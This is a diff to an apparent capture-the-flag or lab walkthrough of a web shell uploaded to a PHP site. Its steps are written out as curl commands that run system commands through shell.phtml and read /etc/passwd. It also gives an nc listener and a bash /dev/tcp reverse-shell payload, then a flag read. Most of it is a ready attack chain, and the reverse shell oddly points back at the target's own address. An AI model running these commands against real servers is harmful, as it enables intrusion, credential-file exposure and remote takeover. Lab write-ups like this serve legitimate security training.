@@ -89,21 +89,37 @@ accept attribute restricts the file type.
     }
     ?>
    ```
-3) Verify the code execution by running a simple commnand:
+2) Verify the code execution by running a simple commnand:
    ```
    curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=whoami"
    curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=id"
    ```
-5) Gather more information about the system:
+3) Gather more information about the system:
    ```
    curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=hostname"
    ```
+-->> Now, Hostname, kernel version, and executing any command on the system.
+* www-data is the default user for the Apache web server on Ubujntu
 
+4) Reading Sensitive file 
+   ```
+   curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=cat+/etc/passwd" | grep -v "nologin"
+   ```
 
+5) Obtaining a Reverse Shell. setting up a listener:
+   ```
+   nc -lvnp 4444
+   ```
 
+6) Trigger the reverse shell through the web shell.
+   ```
+   curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.67.155.72/4444+0>%261'"
+   ```
 
-
-
+7) To get a flag:
+   ```
+   cat /var/www/flag.txt
+   ```
 
 
 
